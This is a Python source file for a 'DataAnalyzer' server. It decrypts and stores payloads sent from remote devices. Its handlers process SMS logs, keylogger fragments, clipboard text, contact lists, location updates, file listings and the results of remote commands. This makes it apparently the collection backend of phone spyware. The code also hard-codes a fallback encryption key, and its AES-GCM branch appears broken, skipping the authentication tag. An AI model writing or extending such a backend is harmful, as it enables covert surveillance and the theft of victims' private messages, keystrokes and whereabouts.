import os
import json
import logging
import base64
import sqlite3
from typing import Dict, Any, Optional

import requests
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class DataAnalyzer:
    def __init__(self, db_path: str = "analyzed_data.db"):
        self.db_path = db_path
        self._init_db()
        master_key_b64 = os.environ.get("MASTER_SECRET_B64")
        if not master_key_b64:
            logger.warning("MASTER_SECRET_B64 not set, using insecure default key (for testing only)")
            master_key_b64 = "dGVzdC1rZXktMTIzNDU2Nzg5MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTI="
        self.master_key = base64.b64decode(master_key_b64)
        self._setup_crypto()

    def _init_db(self):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute('''
            CREATE TABLE IF NOT EXISTS processed_data (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device_id TEXT NOT NULL,
                data_type TEXT NOT NULL,
                content TEXT,
                received_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        c.execute('''
            CREATE TABLE IF NOT EXISTS errors (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                error TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        conn.commit()
        conn.close()

    def _setup_crypto(self):
        self.fernet = Fernet(base64.b64encode(self.master_key[:32]))
        self.backend = default_backend()

    def decrypt_payload(self, encrypted_b64: str, version: int = 2) -> Optional[bytes]:
        try:
            raw = base64.b64decode(encrypted_b64)
            if version == 1:
                iv = raw[:12]
                ct = raw[12:]
                cipher = Cipher(algorithms.AES(self.master_key[:32]), modes.GCM(iv), backend=self.backend)
                decryptor = cipher.decryptor()
                return decryptor.update(ct) + decryptor.finalize()
            elif version == 2:
                return self.fernet.decrypt(raw)
            else:
                logger.error(f"Unsupported encryption version: {version}")
                return None
        except Exception as e:
            logger.error(f"Decryption failed: {e}")
            return None

    def analyze(self, device_id: str, encrypted_payload: str, version: int = 2) -> Dict[str, Any]:
        decrypted = self.decrypt_payload(encrypted_payload, version)
        if not decrypted:
            self._log_error(f"Decryption failed for device {device_id}")
            return {"status": "error", "message": "decryption failed"}

        try:
            data = json.loads(decrypted.decode('utf-8'))
        except Exception as e:
            self._log_error(f"Invalid JSON from device {device_id}: {e}")
            return {"status": "error", "message": "invalid json"}

        data_type = data.get("type", "unknown")
        content = data.get("content", {})
        result = self._process_data(device_id, data_type, content)
        self._store_data(device_id, data_type, json.dumps(content))
        return result

    def _process_data(self, device_id: str, data_type: str, content: Any) -> Dict[str, Any]:
        logger.info(f"Processing {data_type} from {device_id}")
        if data_type == "sms_log":
            return self._handle_sms(device_id, content)
        elif data_type == "location_update":
            return self._handle_location(device_id, content)
        elif data_type == "contact_list":
            return self._handle_contacts(device_id, content)
        elif data_type == "app_list":
            return self._handle_apps(device_id, content)
        elif data_type == "keylog":
            return self._handle_keylog(device_id, content)
        elif data_type == "clipboard":
            return self._handle_clipboard(device_id, content)
        elif data_type == "file_info":
            return self._handle_file_info(device_id, content)
        elif data_type == "command_result":
            return self._handle_command_result(device_id, content)
        elif data_type == "heartbeat":
            return {"status": "ok", "processed": "heartbeat"}
        else:
            logger.warning(f"Unknown data type {data_type} from {device_id}")
            return {"status": "ignored", "reason": "unknown_type"}

    def _handle_sms(self, device_id: str, content: Any) -> Dict[str, Any]:
        if isinstance(content, list):
            count = len(content)
            logger.info(f"Stored {count} SMS messages from {device_id}")
            return {"status": "ok", "count": count}
        return {"status": "error", "reason": "invalid_format"}

    def _handle_location(self, device_id: str, content: Any) -> Dict[str, Any]:
        lat = content.get("lat")
        lon = content.get("lon")
        if lat and lon:
            logger.info(f"Location update from {device_id}: {lat}, {lon}")
            return {"status": "ok"}
        return {"status": "error", "reason": "missing_coords"}

    def _handle_contacts(self, device_id: str, content: Any) -> Dict[str, Any]:
        if isinstance(content, list):
            logger.info(f"Received {len(content)} contacts from {device_id}")
            return {"status": "ok", "count": len(content)}
        return {"status": "error", "reason": "invalid_format"}

    def _handle_apps(self, device_id: str, content: Any) -> Dict[str, Any]:
        if isinstance(content, list):
            logger.info(f"App list from {device_id}: {len(content)} apps")
            return {"status": "ok", "count": len(content)}
        return {"status": "error", "reason": "invalid_format"}

    def _handle_keylog(self, device_id: str, content: Any) -> Dict[str, Any]:
        text = content.get("text", "")
        logger.info(f"Keylog fragment from {device_id}: {len(text)} chars")
        return {"status": "ok", "length": len(text)}

    def _handle_clipboard(self, device_id: str, content: Any) -> Dict[str, Any]:
        text = content.get("text", "")
        logger.info(f"Clipboard from {device_id}: {len(text)} chars")
        return {"status": "ok", "length": len(text)}

    def _handle_file_info(self, device_id: str, content: Any) -> Dict[str, Any]:
        path = content.get("path")
        size = content.get("size")
        if path and size:
            logger.info(f"File info from {device_id}: {path} ({size} bytes)")
            return {"status": "ok"}
        return {"status": "error", "reason": "missing_fields"}

    def _handle_command_result(self, device_id: str, content: Any) -> Dict[str, Any]:
        cmd = content.get("command")
        result = content.get("result")
        if cmd:
            logger.info(f"Command result from {device_id}: {cmd}")
            return {"status": "ok"}
        return {"status": "error", "reason": "missing_command"}

    def _store_data(self, device_id: str, data_type: str, content_json: str):
        try:
            conn = sqlite3.connect(self.db_path)
            c = conn.cursor()
            c.execute('''
                INSERT INTO processed_data (device_id, data_type, content)
                VALUES (?, ?, ?)
            ''', (device_id, data_type, content_json))
            conn.commit()
            conn.close()
        except Exception as e:
            logger.error(f"Failed to store data: {e}")

    def _log_error(self, error_msg: str):
        logger.error(error_msg)
        try:
            conn = sqlite3.connect(self.db_path)
            c = conn.cursor()
            c.execute('INSERT INTO errors (error) VALUES (?)', (error_msg,))
            conn.commit()
            conn.close()
        except:
            pass

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 3:
        print("Usage: analyzer.py <device_id> <encrypted_payload> [version]")
        sys.exit(1)
    device = sys.argv[1]
    payload = sys.argv[2]
    version = int(sys.argv[3]) if len(sys.argv) > 3 else 2
    analyzer = DataAnalyzer()
    result = analyzer.analyze(device, payload, version)
    print(json.dumps(result))